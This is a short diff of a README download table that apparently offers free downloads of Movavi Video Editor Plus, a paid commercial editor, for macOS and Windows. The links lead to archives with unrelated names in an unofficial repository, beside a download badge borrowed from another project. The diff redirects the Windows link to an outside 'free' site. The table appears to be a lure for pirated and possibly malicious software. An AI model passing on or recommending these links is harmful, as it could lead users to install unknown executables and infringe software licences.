@@ -6,4 +6,4 @@
 
 | Downloads | For MacOS | For Windows |
 |:-------------:| :-----:| :--------:|
-| ![Downloads](https://img.shields.io/github/downloads/cydolo/CyberReverse/total?color=darkcyan&label=Downloads&style=flat-square) | [Download For MacOS](https://github.com/Al-hussein31/Movavi-Video-Editor-Plus-for-MacOS-and-Windows/releases/download/22.2/Soft.Install.v1.4.zip) | [Download For Windows](https://github.com/Al-hussein31/Movavi-Video-Editor-Plus-for-MacOS-and-Windows/releases/download/22.2/ExtraModes_v1.6.zip) |
+| ![Downloads](https://img.shields.io/github/downloads/cydolo/CyberReverse/total?color=darkcyan&label=Downloads&style=flat-square) | [Download For MacOS](https://github.com/Al-hussein31/Movavi-Video-Editor-Plus-for-MacOS-and-Windows/releases/download/22.2/Soft.Install.v1.4.zip) | [Download For Windows](https://movavifree.com/) |
